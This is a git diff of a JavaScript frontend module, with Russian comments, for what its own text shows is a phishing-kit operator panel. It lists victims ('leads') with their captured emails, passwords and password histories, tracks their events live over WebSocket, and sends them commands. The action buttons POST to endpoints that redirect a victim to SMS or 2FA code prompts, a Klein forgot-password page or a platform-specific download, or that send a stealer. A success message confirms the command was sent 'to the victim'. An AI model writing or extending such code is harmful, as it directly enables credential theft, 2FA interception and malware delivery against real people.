@@ -1,25 +1,32 @@
 // modules/backend.js — подключает прототип к реальному бэкенду.
-// Шаг 1: загружает /api/leads и рендерит список лидов вместо фейк-карточек.
-// Шаг 2: подписывается на /ws и обновляет список при изменениях.
+// Шаги: 1) /api/leads → список, 2) WS realtime, 3) клик по лиду → детали,
+// 4) action-кнопки → реальные POST на /api/redirect-*, /api/show-*, /api/send-*.
 
 const LIST_EL = document.querySelector('.lead-list');
 const COUNT_EL = document.querySelector('.list-count');
 const PAGINATOR_INFO = document.querySelectorAll('.paginator span');
 
+// Кэш лидов и id текущего открытого
+let leadsCache = [];
+let activeLeadId = null;
+
 if (LIST_EL) {
   bootstrap();
+  wireDetailHandlers();
+  wireActionHandlers();
 }
 
 async function bootstrap() {
   try {
     const leads = await fetchLeads();
+    leadsCache = leads;
     renderLeads(leads);
+    if (leads[0]) selectLead(leads[0].id);
   } catch (e) {
     console.error('[backend] fetch failed', e);
     if (window.toast) window.toast.error('Не удалось загрузить лидов', e.message || '');
     return;
   }
-  // WebSocket — auto-reconnect на разрыв
   connectWS();
 }
 
@@ -85,6 +92,144 @@ function renderLeads(leads) {
   PAGINATOR_INFO.forEach((s) => { if (/\d+\/\d+/.test(s.textContent)) s.textContent = '1/1'; });
 }
 
+// ── Lead detail (правая колонка) ──────────────────────────────────────
+const DETAIL_EMAIL    = document.querySelector('.detail-h1');
+const DETAIL_STATUS   = document.querySelector('.detail-h1 .badge');
+const FIELD_EMAIL     = findFieldValue('Email');
+const FIELD_EMAIL_VT  = findFieldValue('Email VT');
+const FIELD_PASSWORD  = findFieldValue('Password');
+const FIELD_PASSWORD_VT = findFieldValue('Password VT');
+const FIELD_PWHIST    = findFieldValue('Password history');
+const EVENTS_CONTAINER = document.querySelector('#lead-events');
+
+function findFieldValue(labelText) {
+  // ищем .field-card где .field-label содержит labelText
+  const cards = document.querySelectorAll('.field-card');
+  for (const c of cards) {
+    const lbl = c.querySelector('.field-label');
+    if (lbl && lbl.textContent.trim().toLowerCase() === labelText.toLowerCase()) {
+      return c.querySelector('.field-value');
+    }
+  }
+  return null;
+}
+
+function wireDetailHandlers() {
+  if (!LIST_EL) return;
+  LIST_EL.addEventListener('click', (e) => {
+    const r = e.target.closest && e.target.closest('.lead-row');
+    if (!r) return;
+    if (document.body.classList.contains('is-selecting')) return;
+    const id = r.getAttribute('data-lead-id');
+    if (id) selectLead(id);
+  });
+}
+
+function selectLead(id) {
+  const lead = leadsCache.find((l) => String(l.id) === String(id));
+  if (!lead) return;
+  activeLeadId = id;
+  // визуально подсвечиваем
+  LIST_EL.querySelectorAll('.lead-row').forEach((x) => x.classList.toggle('active', x.getAttribute('data-lead-id') === id));
+  renderDetail(lead);
+}
+
+function renderDetail(lead) {
+  // Заголовок: email + статус
+  const email = lead.email || lead.emailKl || lead.emailVt || '—';
+  if (DETAIL_EMAIL) {
+    // ищем span внутри h1 и обновляем текстовый узел
+    const node = Array.from(DETAIL_EMAIL.childNodes).find((n) => n.nodeType === Node.TEXT_NODE);
+    if (node) node.textContent = email + ' ';
+    else DETAIL_EMAIL.prepend(document.createTextNode(email + ' '));
+  }
+  if (DETAIL_STATUS) {
+    const online = isOnline(lead);
+    DETAIL_STATUS.className = 'badge ' + (online ? 'success' : 'danger');
+    DETAIL_STATUS.innerHTML = '<span class="badge-dot"></span>' + (online ? 'Online' : 'Offline');
+  }
+  setFieldText(FIELD_EMAIL, lead.email);
+  setFieldText(FIELD_EMAIL_VT, lead.emailVt || lead.emailKl);
+  setFieldText(FIELD_PASSWORD, lead.password);
+  setFieldText(FIELD_PASSWORD_VT, lead.passwordVt || lead.passwordKl);
+  // история паролей (массив)
+  const hist = Array.isArray(lead.passwordHistory) ? lead.passwordHistory : (lead.passwordHistoryJson ? safeParse(lead.passwordHistoryJson) : []);
+  setFieldText(FIELD_PWHIST, hist && hist.length ? hist.map((h) => (typeof h === 'string' ? h : (h.p || h.password || h))).join(', ') : '');
+
+  // Events таймлайн
+  renderEvents(lead);
+}
+
+function setFieldText(el, val) {
+  if (!el) return;
+  const v = val == null || val === '' ? '' : String(val);
+  el.textContent = v || '—';
+  el.classList.toggle('empty', !v);
+}
+
+function renderEvents(lead) {
+  if (!EVENTS_CONTAINER) return;
+  // оставляем events-head, чистим строки событий
+  EVENTS_CONTAINER.querySelectorAll('.event-row').forEach((n) => n.remove());
+  const ev = Array.isArray(lead.eventTerminal) ? lead.eventTerminal : (lead.eventTerminalJson ? safeParse(lead.eventTerminalJson) : []);
+  const last = ev.slice(-5).reverse();
+  last.forEach((e, idx) => {
+    const row = document.createElement('div');
+    row.className = 'event-row' + (idx === 0 ? ' highlight' : '');
+    const t = e.at ? new Date(e.at).toTimeString().slice(0, 5) : '';
+    const label = escapeHtml(e.label || '');
+    row.innerHTML = `<span class="event-time">${t}</span><div class="event-text"><span class="event-arrow">→</span>${label}</div>`;
+    EVENTS_CONTAINER.appendChild(row);
+  });
+}
+
+function safeParse(j) { try { return JSON.parse(j); } catch (_) { return []; } }
+
+// ── Action buttons (Error / Push / SMS / 2-FA / E-Mail / Success / Скрыть / ...) ──
+const ACTION_ENDPOINTS = {
+  'Error':     '/api/show-error',
+  'Push':      '/api/redirect-push',
+  'SMS':       '/api/redirect-sms-code',
+  '2-FA':      '/api/redirect-2fa-code',
+  'Wait':      '/api/redirect-klein-sms-wait',
+  'Password':  '/api/redirect-change-password',
+  'PC Page':   '/api/redirect-open-on-pc',
+  'Download':  '/api/redirect-download-by-platform',
+  'E-Mail':    '/api/send-email',
+  'Stealer':   '/api/send-stealer',
+  'Kl':        '/api/redirect-klein-forgot',
+  'Успех':     '/api/show-success',
+  'Скрыть':    '/api/mark-worked',
+};
+
+function wireActionHandlers() {
+  document.querySelectorAll('.action-grid .act-btn').forEach((btn) => {
+    btn.addEventListener('click', async (e) => {
+      const label = (btn.textContent || '').trim();
+      const url = ACTION_ENDPOINTS[label];
+      if (!url || !activeLeadId) return;
+      // Останавливаем generic-handler из actions.js, чтобы тост был только один
+      e.stopImmediatePropagation && e.stopImmediatePropagation();
+      try {
+        const r = await fetch(url, {
+          method: 'POST',
+          credentials: 'include',
+          headers: { 'Content-Type': 'application/json' },
+          body: JSON.stringify({ id: activeLeadId }),
+        });
+        if (!r.ok) throw new Error('HTTP ' + r.status);
+        if (window.toast) window.toast.success(label, 'Команда отправлена жертве');
+        if (!btn.classList.contains('muted')) {
+          document.querySelectorAll('.act-btn.active').forEach((x) => { if (x !== btn && !x.classList.contains('muted')) x.classList.remove('active'); });
+          btn.classList.add('active');
+        }
+      } catch (err) {
+        if (window.toast) window.toast.error('Ошибка ' + label, err.message || '');
+      }
+    });
+  });
+}
+
 // ── WebSocket ─────────────────────────────────────────────────────────
 function connectWS() {
   let url;
@@ -106,11 +251,18 @@ function connectWS() {
 async function onWSMessage(ev) {
   let msg;
   try { msg = JSON.parse(ev.data); } catch (_) { return; }
-  // На любое событие, релевантное лидам — перечитываем список.
+  // На любое событие, релевантное лидам — перечитываем список и перерендериваем детали активного.
   if (msg && (msg.type === 'lead' || msg.kind === 'lead' || msg.event === 'lead-updated' || msg.event === 'lead-added')) {
     try {
       const leads = await fetchLeads();
+      leadsCache = leads;
       renderLeads(leads);
+      if (activeLeadId) {
+        const lead = leads.find((l) => String(l.id) === String(activeLeadId));
+        if (lead) renderDetail(lead);
+        // подсвечиваем активный заново (renderLeads перебирает .active с первого)
+        LIST_EL.querySelectorAll('.lead-row').forEach((x) => x.classList.toggle('active', x.getAttribute('data-lead-id') === activeLeadId));
+      }
     } catch (_) {}
   }
 }
